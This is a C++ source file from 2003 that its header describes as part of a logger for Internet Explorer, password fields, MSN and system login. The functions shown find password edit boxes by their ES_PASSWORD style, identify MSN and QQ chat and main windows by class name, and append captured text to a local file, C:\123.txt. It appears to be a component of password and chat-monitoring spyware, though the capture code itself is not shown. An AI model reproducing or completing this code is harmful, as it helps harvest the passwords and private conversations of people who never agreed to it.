/************************************
  REVISION LOG ENTRY
  Revision By: Zhang, Zhefu
  E-mail: codetiger@hotmail.com
  Revised on 7/3/2003 
  Comment: This is part of the logger for IE, password edit, MSN, system login.
           You are free to use to use the code on the base of keeping this comment
		   All rights reserved. May not be sold for profit.
 ************************************/
#include "GlobalDef.h"

// The variable is used to check whether the hWnd is QQ main window.
BOOL g_bIsQQMainWnd = FALSE;


void PopMsg(LPCTSTR pszFormat, ...) 
{
//#ifndef _DEBUG
//	return;
//#endif
   va_list argList;
   va_start(argList, pszFormat);

   TCHAR sz[1024];
//#ifdef _UNICODE
//   vswprintf(sz, pszFormat, argList);
//#else
//   vsprintf(sz, pszFormat, argList);
//#endif
   wvsprintf(sz, pszFormat, argList);
   va_end(argList);
   ::MessageBox(NULL, sz, _T("Qoom"), MB_OK | MB_ICONINFORMATION);
}

void ReportErr(LPCTSTR str, ...)
{
/*
	LPVOID lpMsgBuf;
    FormatMessage( 
       FORMAT_MESSAGE_ALLOCATE_BUFFER | 
       FORMAT_MESSAGE_FROM_SYSTEM | 
       FORMAT_MESSAGE_IGNORE_INSERTS,
       NULL,
       ::GetLastError(),
       MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), // Default language
       (LPTSTR) &lpMsgBuf,
       0,
       NULL 
   );
	::MessageBox( NULL, (LPCTSTR)lpMsgBuf, 
	   str, MB_OK | MB_ICONINFORMATION );
   // Free the buffer.
   LocalFree( lpMsgBuf );
*/
	va_list argList;
	va_start(argList, str);

	TCHAR sz[1024];
	//#ifdef _UNICODE
	//   vswprintf(sz, pszFormat, argList);
	//#else
	//   vsprintf(sz, pszFormat, argList);
	//#endif
	wvsprintf(sz, str, argList);
	va_end(argList);
	::MessageBox(NULL, sz, _T("Qoom"), MB_OK | MB_ICONINFORMATION);
	   
}

BOOL WriteLogStr(LPCVOID str) 
{
	HANDLE hfile = CreateFile(_T("C:\\123.txt"), GENERIC_WRITE, 0, 
		NULL, OPEN_ALWAYS, 0, 0);
	if (hfile != NULL)
	{
		SetFilePointer(hfile, 0, NULL, FILE_END); 
		char szBuffer[128] = {0};
		WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)str, -1, szBuffer, 128, NULL, NULL);
		DWORD dwSize;
		WriteFile(hfile, (LPCVOID)szBuffer, strlen(szBuffer), &dwSize, NULL);
		WriteFile(hfile, _T("\n"), strlen((const char *)_T("\n")), &dwSize, NULL);
		
		CloseHandle(hfile);
		return TRUE;
	}
	return FALSE;
}

BOOL WriteLogInt(DWORD dwData, int radix) 
{
	TCHAR buffer[200] = {0};
	ltoa(dwData, (char *)buffer, radix);
	return WriteLogStr((LPCVOID)buffer);
}

typedef struct tagStructChatArray
{
	HWND  hWnd;
	TCHAR szClassName[256];
} structChatArray;

static BOOL CALLBACK EnumChildProc(
								   HWND hwnd,      // handle to child window
								   LPARAM lParam   // application-defined value
								   )
{
	structChatArray* myPara = (structChatArray*)lParam;
	TCHAR szClassName[128] = {0};
	int nRet = GetClassName(hwnd, szClassName, 128);
	if(nRet == 0) return TRUE; //go next
	szClassName[nRet] = 0;

	if(::lstrcmpi(szClassName, myPara->szClassName) == 0) //got it
	{
//		::MessageBox( NULL, _T("ook"), 
//			_T("asdf"), MB_OK | MB_ICONINFORMATION );
		g_bIsQQMainWnd = TRUE;
		return FALSE;
	}
	return TRUE;
}

// If the child window's class name is "Tencent_QQToolBar",
// then the parent window must be QQ2005 main window.
BOOL EnumQQChildWindow(HWND hParent, LPCTSTR szClassName)
{
	g_bIsQQMainWnd = FALSE;
	structChatArray myPara;
	myPara.hWnd = hParent;
	::lstrcpy(myPara.szClassName,szClassName);
	::EnumChildWindows(hParent, EnumChildProc, (LPARAM)(LPVOID)&myPara);
    
	if (g_bIsQQMainWnd == TRUE) 
	{
		return TRUE;
	}
	return FALSE;
}

//More criterion Could be applied here 
//ie. C#'s edit is WindowsForms10.EDIT.appx. ....
BOOL IsPasswordEdit(HWND hEdit)
{
	TCHAR szClassName[64];
	int nRet = GetClassName(hEdit, szClassName, 64);
    if(nRet == 0) return FALSE;
	szClassName[nRet] = 0;
	if(::lstrcmp(szClassName, _T("Edit")) == 0 || 
	   ::lstrcmp(szClassName, _T("ThunderTextBox")) == 0 ||
	   ::lstrcmp(szClassName, _T("TEdit")) == 0)
	{
		DWORD dw = ::GetWindowLong(hEdit,GWL_STYLE);
	    dw &= ES_PASSWORD;
        if(dw == ES_PASSWORD)
		   return TRUE;
	}
	return FALSE;
}

//Chat Window's name is "IMWindowClass" in MSN IM 4.6, 4.7, 5.0 and 6.0
//but the main window's name changed. 
BOOL IsMSNChat(HWND hWnd)
{
	TCHAR szClassName[64];
	int nRet = GetClassName(hWnd, szClassName, 64);
    if(nRet == 0) return FALSE; //Maybe a long class name, just let it go
	szClassName[nRet] = 0;
	if(::lstrcmp(szClassName, _T("IMWindowClass")) != 0) return FALSE;
	return TRUE;
}

//Messenger 4.6, 4.7 MSBLClass
//Messenger 5.0 MSNMSBLClass
//This is the Messenger Main Window which Contains the Contact List
BOOL IsMSNMain(HWND hWnd)
{
    TCHAR szClassName[64];
	int nRet = GetClassName(hWnd, szClassName, 64);
    if(nRet == 0) return FALSE; //Maybe a long class name, just let it go
	szClassName[nRet] = 0;
	//MSBLWindowClass for 8.0
	//MSNMSBLClass for 7.5
	if (::lstrcmp(szClassName, _T("MSNMSBLClass")) != 0 && 
		::lstrcmp(szClassName, _T("MSBLClass")) != 0 &&
		::lstrcmp(szClassName, _T("MSBLWindowClass")) != 0) 
		return FALSE;
	return TRUE;
}

// If chat window's sibling window's class name is "Tencent_QQToolBar"
// then this window may be the QQ2005's chat window.
// Also we should use the title name to just whether the window is 
// really the chat window.
BOOL IsQQChat(HWND hWnd)
{
	// Because when begin creating the chat window, the title is not setted yet.
	// So we can't use the title to identify the QQ chat window.
/*
	HWND hParent = GetParent(hWnd);
	if (hParent == NULL) 
	{
		return FALSE;
	}
	if (IsQQMain(hParent)) 
	{
		TCHAR szClassName[64];
		int nRet = GetWindowTextW(hWnd, szClassName, 64);
		if(nRet == 0) return FALSE; //Maybe a long class name, just let it go
		szClassName[nRet] = 0;

		WriteLogStr(szClassName);

		if (CSTR_EQUAL == CompareString(LOCALE_SYSTEM_DEFAULT,
			NORM_IGNORECASE,szClassName,2, _T("Óë"), 2))
		{
			return TRUE;
		}
	}
	return FALSE;
*/
	if (EnumQQChildWindow(hWnd, _T("MCIWndClass")) == TRUE)
	{
		return TRUE;
	}
	return FALSE;
}

// If the windows' child's class name is Tencent_QQToolBar, 
// then this handle must be QQ2005 main window's handle.
// This is the Messenger Main Window which Contains the Contact List
BOOL IsQQMain(HWND hWnd)
{
	if (EnumQQChildWindow(hWnd, _T("Tencent_QQToolBar")) == TRUE)
	{
		return TRUE;
	}
	return FALSE;
}

// test
BOOL IsQQMainWindow(HWND hWnd)
{
	// Get the QQ main window from the child qqbar.
	TCHAR szClassName[64] = {0};
	int nRet = GetClassName(hWnd, szClassName, 64);			
	if (nRet > 0) 
	{
		if(::lstrcmp(szClassName, _T("Tencent_QQToolBar")) == 0) 
		{
			// Got it.
			//MessageBox(NULL, _T("Found"), _T("Found QQ main"), MB_OK);
			return TRUE;
		}
		
	}

	return FALSE;
}

BOOL IsDialog(HWND hWnd)
{
	if (hWnd == NULL) return FALSE;
	TCHAR szClassName[64] = {0};
	int nRet = GetClassName(hWnd, szClassName, 64);
    if(nRet == 0) return FALSE; //Maybe a long class name, just let it go
	szClassName[nRet] = 0;
	if(::lstrcmp(szClassName, _T("#32770")) != 0) return FALSE;
	return TRUE;
}

BOOL IsAfxWnd(HWND hWnd)
{
	if (hWnd == NULL) return FALSE;
	TCHAR szClassName[64] = {0};
	int nRet = GetClassName(hWnd, szClassName, 64);
    if(nRet == 0) return FALSE; //Maybe a long class name, just let it go
	szClassName[nRet] = 0;
	if(::lstrcmp(szClassName, _T("Afx:61660000:0")) != 0) return FALSE;
	return TRUE;
}

BOOL IsRichedit(HWND hWnd)
{
	if (hWnd == NULL) return FALSE;
	TCHAR szClassName[64] = {0};
	int nRet = GetClassName(hWnd, szClassName, 64);
    if(nRet == 0) return FALSE; //Maybe a long class name, just let it go
	szClassName[nRet] = 0;
	if (::lstrcmp(szClassName, _T("RICHEDIT")) != 0 &&
		::lstrcmp(szClassName, _T("RicheditA")) != 0 &&
		::lstrcmp(szClassName, _T("RicheditW")) != 0) {
		return FALSE;
	}
	return TRUE;
}
